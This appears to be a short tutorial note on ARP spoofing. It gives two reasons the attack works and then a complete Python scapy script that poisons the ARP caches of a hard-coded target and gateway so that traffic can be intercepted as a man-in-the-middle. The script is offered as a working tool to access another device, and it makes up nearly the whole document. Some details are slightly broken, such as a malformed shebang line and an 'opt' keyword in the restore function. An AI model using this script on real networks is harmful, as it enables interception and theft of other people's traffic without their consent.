# ARP Spoofing

## why ARP Spoofing is possible :
* 1) CLient accept responses even if they did not send a request.
* 2) Client trust response without any from of verification.

---

# this is the script that accsess you in another device
```
#!/usr/bin/env/ python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_List = scapy.srp(arp_request_broadcast, timeout = 1 , verbose=False)[0]

    return answered_List[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose =False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(opt=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4,verbose=False)

target_ip = "10.0.2.15"
getway_ip = "10.0.2.1"


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, getway_ip)
        spoof(getway_ip, target_ip)
        sent_packets_count = sent_packets_count+2
        print("\r[+] Sent two packets " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ...... REsetting ARP tables ......Please wait.\n")
    restore(target_ip, getway_ip)
    restore(getway_ip, target_ip)
```